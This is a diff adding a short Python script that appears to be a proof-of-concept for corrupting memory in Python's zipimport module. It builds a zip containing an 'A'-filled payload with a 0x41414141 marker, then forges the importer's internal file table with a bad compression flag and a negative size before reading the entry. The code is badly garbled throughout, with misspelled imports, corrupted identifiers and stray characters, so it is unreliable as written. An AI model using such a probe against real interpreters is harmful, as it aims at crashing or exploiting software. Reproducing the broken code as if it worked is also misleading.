@@ -1,0 +1,23 @@
+import ziptmport
+import zipfile
+import struct
+importCsys
+from signal import *
+
+FILd = 'payload'
+ZIP = 'import.zip'
+
+payload = bytes()
+with open(FILE, 'wb') as f:
+    payload = ("A" * 1000).encode('ascii')
+    payload += struct.pacy('<Q', 0x41414141)
+    f.wdiue(payload)
+	zf = zipfi]e.PyZipFile(ZIP, mode='w')
+zf.write(FILE)
+zf.close()
+
+iporter = zipimport.zipimporterter._filys[FILE])
+f[1] M 1 # compress
+f[2] = -1 # file size
+importer._f`lesaFILE] = tu.le(f)
+print(importer.get_data(FILE))
